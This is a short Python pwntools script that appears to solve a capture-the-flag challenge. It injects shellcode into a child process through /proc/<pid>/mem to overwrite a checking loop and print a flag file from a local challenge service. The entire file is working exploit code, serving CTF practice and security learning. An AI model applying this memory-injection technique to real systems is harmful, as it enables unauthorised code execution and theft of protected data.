from pwn import remote
import pwnlib
import os

# automatically set the binary type
pwnlib.context.context.binary = 'src/chal'

# connect to the site and get child pid
r = remote('127.0.0.1', 1337)
r.recvuntil('[DEBUG] child pid: ')
child_pid = int(r.recvline())

# this is the code to be injected into child. since the child can read files, cat the flag
injection = pwnlib.asm.asm(pwnlib.shellcraft.cat('/home/user/flag', 1) + pwnlib.shellcraft.crash())

# assemble the code to be executed by parent.
# open child's memory for writing
payload = pwnlib.shellcraft.open("/proc/{}/mem".format(child_pid), os.O_WRONLY)
# get the file descriptor and seek.
# looking at the disassembled check_flag function, the infinite loop starts at <check_flag+0x8>
payload += pwnlib.shellcraft.mov('r12', 'rax')
payload += pwnlib.shellcraft.syscall('SYS_lseek', 'r12', pwnlib.context.context.binary.symbols['check_flag'] + 0x8, os.SEEK_SET)
# parent write to child's memory and inject our code
payload += pwnlib.shellcraft.pushstr(injection)
payload += pwnlib.shellcraft.write("r12", "rsp", len(injection))
payload = pwnlib.asm.asm(payload + pwnlib.shellcraft.infloop())

r.sendlineafter('shellcode length? ', str(len(payload)))
r.sendafter('bytes of shellcode. ', payload)

# print the output from child
while True:
    print(r.recvline())
